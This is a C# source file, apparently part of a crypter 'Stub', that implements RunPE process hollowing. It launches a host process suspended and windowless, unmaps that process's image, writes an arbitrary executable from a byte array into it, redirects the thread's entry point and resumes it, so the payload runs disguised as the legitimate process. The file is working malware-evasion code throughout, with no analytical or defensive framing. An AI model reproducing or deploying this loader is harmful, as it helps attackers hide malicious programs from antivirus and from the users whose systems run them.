using System;
using System.Collections.Generic;
using System.Text;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace Stub.Core.RunPE
{
    public static unsafe class CMemoryExecute
    {
        /// <summary>
        /// Runs an EXE (which is loaded in a byte array) in memory.
        /// </summary>
        /// <param name="exeBuffer">The EXE buffer.</param>
        /// <param name="hostProcess">Full path of the host process to run the buffer in.</param>
        /// <param name="optionalArguments">Optional command line arguments.</param>
        /// <returns></returns>
        public static bool Run(byte[] exeBuffer, string hostProcess, string optionalArguments, out int iProcessID)
        {
            iProcessID = -1;

            byte[] IMAGE_SECTION_HEADER = new byte[0x28]; // pish
            byte[] IMAGE_NT_HEADERS = new byte[0xf8]; // pinh
            byte[] IMAGE_DOS_HEADER = new byte[0x40]; // pidh
            //int[] PROCESS_INFO = new int[0x4]; // pi
            byte[] CONTEXT = new byte[0x2cc]; // ctx

            byte* pish;
            fixed (byte* p = &IMAGE_SECTION_HEADER[0])
                pish = p;

            byte* pinh;
            fixed (byte* p = &IMAGE_NT_HEADERS[0])
                pinh = p;

            byte* pidh;
            fixed (byte* p = &IMAGE_DOS_HEADER[0])
                pidh = p;

            byte* ctx;
            fixed (byte* p = &CONTEXT[0])
                ctx = p;

            // Set the flag.
            *(uint*)(ctx + 0x0 /* ContextFlags */) = CONTEXT_FULL;

            // Get the DOS header of the EXE.
            Buffer.BlockCopy(exeBuffer, 0, IMAGE_DOS_HEADER, 0, IMAGE_DOS_HEADER.Length);

            /* Sanity check:  See if we have MZ header. */
            if (*(ushort*)(pidh + 0x0 /* e_magic */) != IMAGE_DOS_SIGNATURE)
                return false;

            int e_lfanew = *(int*)(pidh + 0x3c);

            // Get the NT header of the EXE.
            Buffer.BlockCopy(exeBuffer, e_lfanew, IMAGE_NT_HEADERS, 0, IMAGE_NT_HEADERS.Length);

            /* Sanity check: See if we have PE00 header. */
            if (*(uint*)(pinh + 0x0 /* Signature */) != IMAGE_NT_SIGNATURE)
                return false;

            // Run with parameters if necessary.
            if (!string.IsNullOrEmpty(optionalArguments))
                hostProcess += " " + optionalArguments;

            PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();
            STARTUPINFO sInfo = new STARTUPINFO();
            SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
            SECURITY_ATTRIBUTES tSec = new SECURITY_ATTRIBUTES();
            pSec.nLength = Marshal.SizeOf(pSec);
            tSec.nLength = Marshal.SizeOf(tSec);

            //if (!CreateProcess(null, hostProcess, IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED + CREATE_NO_WINDOW, IntPtr.Zero, null, new byte[0x44], PROCESS_INFO))
              //  return false;

            if (!CreateProcess(null, hostProcess,
     ref pSec, ref tSec, false, CREATE_SUSPENDED + CREATE_NO_WINDOW,
     IntPtr.Zero, null, ref sInfo, out pInfo))
                return false;
            iProcessID = pInfo.dwProcessId;

            IntPtr ImageBase = new IntPtr(*(int*)(pinh + 0x34));
            NtUnmapViewOfSection((IntPtr)pInfo.hProcess /* pi.hProcess */, ImageBase);
            if (VirtualAllocEx((IntPtr)pInfo.hProcess /* pi.hProcess */, ImageBase, *(uint*)(pinh + 0x50 /* SizeOfImage */), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE) == IntPtr.Zero)
                Run(exeBuffer, hostProcess, optionalArguments, out iProcessID); // Memory allocation failed; try again (this can happen in low memory situations)

            fixed (byte* p = &exeBuffer[0])
                NtWriteVirtualMemory((IntPtr)pInfo.hProcess /* pi.hProcess */, ImageBase, (IntPtr)p, *(uint*)(pinh + 84 /* SizeOfHeaders */), IntPtr.Zero);

            for (ushort i = 0; i < *(ushort*)(pinh + 0x6 /* NumberOfSections */); i++)
            {
                Buffer.BlockCopy(exeBuffer, e_lfanew + IMAGE_NT_HEADERS.Length + (IMAGE_SECTION_HEADER.Length * i), IMAGE_SECTION_HEADER, 0, IMAGE_SECTION_HEADER.Length);
                fixed (byte* p = &exeBuffer[*(uint*)(pish + 0x14 /* PointerToRawData */)])
                    NtWriteVirtualMemory((IntPtr)pInfo.hProcess /* pi.hProcess */, (IntPtr)((int)ImageBase + *(uint*)(pish + 0xc /* VirtualAddress */)), (IntPtr)p, *(uint*)(pish + 0x10 /* SizeOfRawData */), IntPtr.Zero);
            }

            NtGetContextThread((IntPtr)pInfo.hThread /* pi.hThread */, (IntPtr)ctx);
            NtWriteVirtualMemory((IntPtr)pInfo.hProcess /* pi.hProcess */, (IntPtr)(*(uint*)(ctx + 0xAC /* ecx */)), ImageBase, 0x4, IntPtr.Zero);
            *(uint*)(ctx + 0xB0 /* eax */) = (uint)ImageBase + *(uint*)(pinh + 0x28 /* AddressOfEntryPoint */);
            NtSetContextThread((IntPtr)pInfo.hThread /* pi.hThread */, (IntPtr)ctx);
            NtResumeThread((IntPtr)pInfo.hThread/* pi.hThread */, IntPtr.Zero);


            return true;
        }

        #region WinNT Definitions

        private const uint CONTEXT_FULL = 0x10007;
        private const int CREATE_SUSPENDED = 0x4;
        private const int CREATE_NO_WINDOW = 0x08000000;
        private const int MEM_COMMIT = 0x1000;
        private const int MEM_RESERVE = 0x2000;
        private const int PAGE_EXECUTE_READWRITE = 0x40;
        private const ushort IMAGE_DOS_SIGNATURE = 0x5A4D; // MZ
        private const uint IMAGE_NT_SIGNATURE = 0x00004550; // PE00

        #region WinAPI
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CreateProcess(string lpApplicationName,
           string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes,
           ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles,
           uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
           ref STARTUPINFO lpStartupInfo,
           out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern uint NtUnmapViewOfSection(IntPtr hProcess, IntPtr lpBaseAddress);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtWriteVirtualMemory(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, uint nSize, IntPtr lpNumberOfBytesWritten);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtGetContextThread(IntPtr hThread, IntPtr lpContext);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetContextThread(IntPtr hThread, IntPtr lpContext);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern uint NtResumeThread(IntPtr hThread, IntPtr SuspendCount);
        #endregion

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct STARTUPINFOEX
        {
            public STARTUPINFO StartupInfo;
            public IntPtr lpAttributeList;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr lpSecurityDescriptor;
            public int bInheritHandle;
        }

        #endregion
    }
}
